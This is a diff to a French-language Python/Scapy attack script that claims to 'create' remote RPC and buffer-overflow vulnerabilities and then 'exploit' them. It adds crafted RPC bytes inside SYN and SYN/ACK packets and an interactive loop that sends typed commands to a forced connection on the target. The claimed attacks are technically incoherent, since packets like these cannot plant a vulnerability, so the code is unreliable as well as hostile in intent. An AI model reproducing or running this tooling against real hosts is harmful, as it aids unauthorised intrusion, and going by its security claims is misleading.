@@ -16,7 +16,7 @@ def log_info(message):
 
 def log_error(message):
     logging.error(message)
-    print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
+    print(f"{Fore.BLUE}[ERROR] {message}{Style.RESET_ALL}")
 
 def get_ip_from_input(input_str):
     try:
@@ -38,8 +38,8 @@ def get_dynamic_ip(target):
 
 def print_banner():
     banner = f"""
-{Fore.GREEN}
-   /$$$$$$$$ /$$$$$$ /$$   /$$ /$$$$$$$$ /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
+{Fore.RED}
+/$$$$$$$$ /$$$$$$ /$$   /$$ /$$$$$$$$ /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
 |__  $$__/|_  $$_/| $$  /$$/|__  $$__/| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/
    | $$     | $$  | $$ /$$/    | $$   | $$  | $$| $$  \ $$| $$  \__/| $$ /$$/ 
    | $$     | $$  | $$$$$/     | $$   | $$$$$$$$| $$$$$$$$| $$      | $$$$$/  
@@ -47,6 +47,9 @@ def print_banner():
    | $$     | $$  | $$\  $$    | $$   | $$  | $$| $$  | $$| $$    $$| $$\  $$ 
    | $$    /$$$$$$| $$ \  $$   | $$   | $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$
    |__/   |______/|__/  \__/   |__/   |__/  |__/|__/  |__/ \______/ |__/  \__/
+                                                                              
+                                                                              
+                                                                              
     """
     print(banner)
 
@@ -63,29 +66,42 @@ def is_valid_ip(ip):
         return True
     except socket.error:
         return False
-
-def create_buffer_overflow_vulnerability(target, port):
+def create_rpc_vulnerability(target, port):
     target_ip = get_dynamic_ip(target)
     if target_ip is None:
         return False
 
     try:
         ip = IP(dst=target_ip)
-        payload = b"B" * 3000
-        vulnerable_tcp = TCP(dport=port, flags="S") / payload
+
+        # Construction d'une requête RPC spécialement conçue
+        rpc_request = (
+            b"\x80\x00\x00\x00"  # Version
+            b"\x00\x00\x00\x01"  # Type (Request)
+            b"\x00\x00\x00\x04"  # Body Length
+            b"\x00\x00\x00\x01"  # Program ID
+            b"\x00\x00\x00\x02"  # Program Version
+            b"\x00\x00\x00\x03"  # Procedure
+            b"\x00\x00\x00\x00"  # Credential
+            b"\x00\x00\x00\x00"  # Verifier
+        )
+
+        vulnerable_rpc = TCP(dport=port, flags="S") / rpc_request
 
         # Utilisation de sr1 avec timeout pour éviter l'erreur 408
-        response = sr1(ip / vulnerable_tcp, timeout=2, verbose=0)
+        response = sr1(ip / vulnerable_rpc, timeout=2, verbose=0)
         if response is not None and response.haslayer(TCP) and response[TCP].flags & 2:
-            log_info("[+] Vulnérabilité de débordement de tampon intentionnelle créée")
+            log_info("[+] Vulnérabilité RPC intentionnelle créée")
             return True
         else:
-            log_error("[-] La création de la vulnérabilité a échoué. Aucune réponse SYN/ACK reçue.")
+            log_error("[-] La création de la vulnérabilité RPC a échoué. Aucune réponse SYN/ACK reçue.")
             return False
     except Exception as e:
-        log_error("[-] Échec de la création de la vulnérabilité de débordement de tampon intentionnelle")
+        log_error("[-] Échec de la création de la vulnérabilité RPC intentionnelle")
         log_error(f"Erreur : {str(e)}")
         return False
+
+
 def syn_ack_exploit(target, port):
     target_ip = get_dynamic_ip(target)
     if target_ip is None:
@@ -99,6 +115,36 @@ def syn_ack_exploit(target, port):
         return True
     except Exception as e:
         log_error("[-] Exploitation échouée - Impossible d'envoyer SYN/ACK")
+        log_error(f"Erreur : {str(e)}")
+        return False
+
+def rpc_exploit(target, port):
+    target_ip = get_dynamic_ip(target)
+    if target_ip is None:
+        return False
+
+    try:
+        ip = IP(dst=target_ip)
+
+        # Utilisation de l'appel RPC pour l'exploitation
+        rpc_request = (
+            b"\x80\x00\x00\x00"  # Version
+            b"\x00\x00\x00\x01"  # Type (Request)
+            b"\x00\x00\x00\x04"  # Body Length
+            b"\x00\x00\x00\x01"  # Program ID
+            b"\x00\x00\x00\x02"  # Program Version
+            b"\x00\x00\x00\x03"  # Procedure
+            b"\x00\x00\x00\x00"  # Credential
+            b"\x00\x00\x00\x00"  # Verifier
+        )
+
+        rpc_exploit_packet = TCP(dport=port, flags="SA") / rpc_request
+        sr1(ip / rpc_exploit_packet, timeout=1, verbose=0)
+
+        log_info("[+] Exploitation RPC - SYN/ACK forcé envoyé avec succès")
+        return True
+    except Exception as e:
+        log_error("[-] Exploitation RPC échouée - Impossible d'envoyer SYN/ACK")
         log_error(f"Erreur : {str(e)}")
         return False
 
@@ -270,7 +316,7 @@ def fetch_user_data_from_remote(host, port, output_file_path="user_data_output.t
         log_error(f"[-] Erreur : {str(e)}")
         return False
 
-def force_connection(target, port):
+def force_connection_and_interact(target, port):
     try:
         target_ip = get_dynamic_ip(target)
         if target_ip is None:
@@ -289,6 +335,16 @@ def force_connection(target, port):
             response = forced_socket.recv(1024)
             log_info("[+] Connexion forcée réussie. Réponse du serveur : {}".format(response.decode()))
 
+            # Interaction avec la remote host
+            while True:
+                command = input("Entrez une commande à exécuter sur la remote host (ou 'exit' pour quitter) : ")
+                if command.lower() == 'exit':
+                    break
+
+                forced_socket.sendall(command.encode())
+                response = forced_socket.recv(1024)
+                log_info("[+] Réponse de la remote host : {}".format(response.decode()))
+
         log_info("[+] Connexion fermée")
     except Exception as e:
         log_error("[-] Erreur lors de la connexion forcée : {}".format(str(e)))
@@ -297,15 +353,15 @@ if __name__ == "__main__":
     try:
         print_banner()
 
-        target_for_vulnerability = input("Entrez l'adresse IP ou l'URL de la cible pour créer la vulnérabilité : ")
-        port_for_vulnerability = int(input("Entrez le port pour créer la vulnérabilité : "))
+        target_for_vulnerability = input("Entrez l'adresse IP ou l'URL de la cible pour créer la vulnérabilité RPC : ")
+        port_for_vulnerability = int(input("Entrez le port pour créer la vulnérabilité RPC : "))
 
         target_for_exploit = input("Entrez l'adresse IP ou l'URL de la cible pour l'exploitation : ")
         port_for_exploit = int(input("Entrez le port pour l'exploitation : "))
 
         target_for_exploit_ip = get_dynamic_ip(target_for_exploit)
         if target_for_exploit_ip is not None:
-            if create_buffer_overflow_vulnerability(target_for_vulnerability, port_for_vulnerability):
+            if create_rpc_vulnerability(target_for_vulnerability, port_for_vulnerability):
                 time.sleep(2)
                 if syn_ack_exploit(target_for_exploit_ip, port_for_exploit):
                     time.sleep(2)
@@ -319,9 +375,9 @@ if __name__ == "__main__":
 
                             force_target = input("Voulez-vous forcer la connexion à la cible ? (o/n) : ").lower()
                             if force_target == "o":
-                                force_connection(target_for_exploit_ip, port_for_exploit)
+                                force_connection_and_interact(target_for_exploit_ip, port_for_exploit)
 
     except KeyboardInterrupt:
         log_info("\nScript interrompu.")
         sys.exit(0)
-        
+
